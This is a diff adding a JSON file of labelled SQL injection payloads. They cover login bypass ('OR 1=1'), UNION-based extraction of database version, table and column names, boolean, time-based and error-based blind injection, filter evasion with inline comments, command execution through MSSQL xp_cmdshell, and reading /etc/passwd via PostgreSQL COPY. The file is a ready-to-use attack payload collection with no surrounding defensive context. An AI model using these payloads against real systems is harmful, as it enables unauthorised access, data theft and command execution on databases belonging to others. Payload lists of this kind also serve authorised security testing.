@@ -1,0 +1,14 @@
+{
+  "Basic authentication bypass": "' OR '1'='1' --",
+  "Union-based injection to extract version and user": "' UNION SELECT null, version(), user() --",
+  "List table names in current database": "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() --",
+  "Blind boolean-based injection (true)": "' AND 1=1 --",
+  "Blind boolean-based injection (false)": "' AND 1=2 --",
+  "Time-based blind injection to check DB version": "' OR IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0) --",
+  "Error-based injection to extract DB name": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) --",
+  "Extract column names from 'users' table": "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --",
+  "Execute OS command in MSSQL": "'; EXEC xp_cmdshell('whoami'); --",
+  "Read system file in PostgreSQL": "'; COPY users FROM '/etc/passwd'; --",
+  "Bypass filters using comments": "'/**/OR/**/1=1--",
+  "Bypass auth and limit results": "' OR 1=1 LIMIT 1 OFFSET 1 --"
+}
